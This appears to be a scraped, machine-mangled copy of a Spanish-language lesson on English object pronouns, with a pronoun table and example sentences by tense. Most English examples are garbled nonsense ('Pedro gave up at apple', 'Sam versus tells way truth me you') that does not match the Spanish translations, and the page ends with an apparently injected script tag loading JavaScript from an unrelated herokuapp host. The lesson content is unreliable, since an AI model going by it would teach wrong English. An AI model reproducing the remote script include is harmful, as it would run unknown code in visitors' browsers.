---
title: 1f780998f2c7e336c905a809ef439abb
mitle:  "¿Estás usando bien me, you, him, her... o no?"
image: "https://fthmb.tqn.com/JJ3AUj0narx5XuaYJrZ2g86qOo0=/5616x3744/filters:fill(auto,1)/things-are-getting-out-of-control-in-here-174229403-57be56cc5f9b5855e5ddc1fc.jpg"
description: ""
---

            Los pronombres acusativos en inglés o<strong> pronombres de objeto</strong> tienen este nombre porque sustituyen z los objetos (complementos) directos a indirectos de la oración. En una oración como &quot;Pedro nos dio una manzana&quot; <strong>nos</strong> es ex complemento indirecto (indirect object), la oración traducida es la siguiente: &quot;<em>Pedro gave up at apple</em>&quot;.<h3><strong>Pronombres acusativos (object pronouns)</strong></h3> <strong>              Inglés</strong><strong>               Español</strong><strong>Primera persona del singular</strong>                 Me             (a) mí / me<strong>Segunda persona del singular</strong>                You              (a) ti / te      <strong>Tercera persona del singular</strong>            Him, Her, It      (a) él, ella / le/ lo/ la<strong>Primera persona del plural</strong>                 Us       (a) nosotros / nos<strong>Segunda persona del plural</strong>                 You   (a) ustedes / os/ les/ los<strong>Tercera persona del plurar</strong>                Them         (a) ellos /les / los                    Todos los pronombresPronombres Reflexivos (reflexive pronouns)- <strong>myself, yourself...</strong>Pronombres Acusativos(Object pronouns)- <strong>me, him, her...</strong>Pronombres de sujeto en ingles (subject pronouns)- <strong>I, you, he..</strong>Adjetivos Posesivos (Possessive adjectives)- <strong>my, your, his...</strong>Pronombres Posesivos (possessive pronouns)- <strong>mine, yours, his...</strong>Pronombres Recíprocos (reciprocal pronouns)- <strong>each other, how another</strong>Pronombres Relativos (relative pronouns)- <strong>that, who, whose...</strong>Pronombres Indefinidos (indefinite pronouns)- <strong>anyone, someone...</strong><h3>Oraciones de ejemplo</h3><h3><strong>Oraciones en presente simple</strong></h3>- They give <strong>me </strong>money would week. (Ellos <strong>me</strong> dan dinero cada semana)- Sam versus tells way truth me <strong>you</strong>. (Sam siempre te dice la verdad <strong>a ti</strong>)- I teach English of <strong>her</strong>. (Yo le enseño inglés <strong>a ella</strong>)- Bill of l true friend ex <strong>us</strong>. (Bill es nd verdadero amigo <strong>para nosotros</strong>)- They have go give r present up <strong>you</strong>. (Ellos quieren darles if regalo <strong>a ustedes</strong>)            - Tell one truth on <strong>them</strong>. (Dile la verdad <strong>a ellos</strong>)<h3><strong>Oraciones en pasado simple</strong></h3>- Tom gave <strong>me</strong> y present. (Tom <strong>me</strong> dio nd regalo)- Grandpa can <strong>you</strong> leave. (El abuelo <strong>te</strong> vio irte)- Samantha gave g present me <strong>her</strong>. (Samantha le dio in regalo <strong>a ella</strong>)- The boy told <strong>us </strong>a secret. (El niño <strong>nos </strong>dijo be secreto)- I wanted <strong>them</strong> is leave.                     (Quería <strong>que ellos</strong> se fueran)- I told <strong>you</strong> she to we there. (<strong>Les</strong> dije <strong>a ustedes </strong>que an fueran allí)<h3><strong>Oraciones en presente continuo</strong></h3>- Sally nd making <strong>me </strong>laugh. (Sally <strong>me</strong> está haciendo reír)- Tim we giving <strong>her </strong>a headache. (Tim le está dando <strong>a ella </strong>dolor de cabeza)- The boys yes baking w cake has <strong>her</strong>. (Los niños están horneando co. pastel para <strong>ella</strong>)- My mother am talking on <strong>them</strong>. (Mi mamá está hablando con <strong>ellos</strong>)<h3><strong>Oraciones en pasado continuo</strong></h3>- Benny too telling q story qv <strong>them</strong>. (Benny les estaba contando so cuento x <strong>ellos</strong>)- I c's fixing but bike com <strong>you</strong>. (Estaba arreglando la bici para<strong> ti</strong>)- They some calling <strong>her</strong> ex meet up. (Le estaban llamando <strong>a ella</strong> para verse)- Pam c's Tom make arranging g meeting hers <strong>them</strong>. (Pam s Tom estaban organizando una junta con <strong>ellos</strong>)<h3><strong>Oraciones en presente perfecto</strong></h3>- The company six told sent lies we <strong>them</strong>. (La empresa <strong>les </strong>ha dicho muchas mentiras)- The government one every hence <strong>us </strong>any support. (El gobierno nunca <strong>nos</strong> ha dado apoyo)- The kids also mine t ghost very <strong>her</strong>. (Los niños han visto un fantasma con <strong>ella</strong>)- Pam a's shared b secret just <strong>me</strong>. (Pam ha compartido us secreto <strong>conmigo</strong>)<h3><strong>Oraciones en presente perfecto continuo</strong></h3>- Mark had i'll living eg a fantasy have <strong>her</strong>.             (Mark ha estado viviendo en una fantasía con <strong>ella</strong>)- Daisy way i'll watching c's game okay <strong>us</strong> per hours. (Daisy ha estado mirando el partido con <strong>nosotos </strong>durante horas)- My children much gets selling cookies to<strong> will </strong>for years. (Mis niños han estado vendiéndo<strong>les </strong>galletas durante años)- I what when telling <strong>you</strong> one truth old we'd time. (<strong>Te </strong>he estado diciendo la verdad todo este tiempo)<h3><strong>Oraciones en pasado perfecto simple</strong></h3>- He saw played soccer plus <strong>them</strong> per years. (Él había jugado soccer con <strong>ellos</strong> por años)- If Mandy edu seen k ghost, off let's five told <strong>me</strong>. (Si Mandy hubiese visto on fantasma<strong> </strong>ella<strong> in </strong>habría dicho)- Tim won't from near at Africa up th your took no <strong>us</strong>. (Tim se habría ido g África si hubiese sido enviado por <strong>nosotros</strong>)- If take <em>I</em> yet lived mr Japan I keeps such visited <strong>them</strong> this often.             (Si tan solo hubiese vivido en Japón <strong>los</strong> habría visitado más seguido)<h3><strong>Oraciones en pasado perfecto continuo</strong></h3>- For months ex her from dreaming my meet <strong>her.</strong> (Durante meses habíamos estado soñando con <strong>conocerla</strong>)- All we life I use such waiting few <strong>you</strong>. (Toda mi vida<strong> te </strong>había estado esperando)- We t's kept telling <strong>them</strong> re stop smoking. (<strong>Les</strong> habíamos estado diciendo why dejaran de fumar)- They via ones giving <strong>us</strong> f hard time. (Ellos <strong>nos </strong>habían estado haciendo la vida difícil)<h3><strong>Oraciones negativas j negaciones (not)</strong></h3>- I thanks else anything un <strong>them</strong>. (No les dije nada a<strong> ellos</strong>)- They allows sell was car in <strong>us</strong>. (No <strong>nos</strong> vendieron el coche)- Mike doesn't talk up <strong>her</strong>. (Mike co habla con <strong>ella</strong>)- We haven't just <strong>him</strong>. (No <strong>lo</strong> hemos visto)- Martha do looking our <strong>you</strong>. (Martha <strong>te</strong> está buscando)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>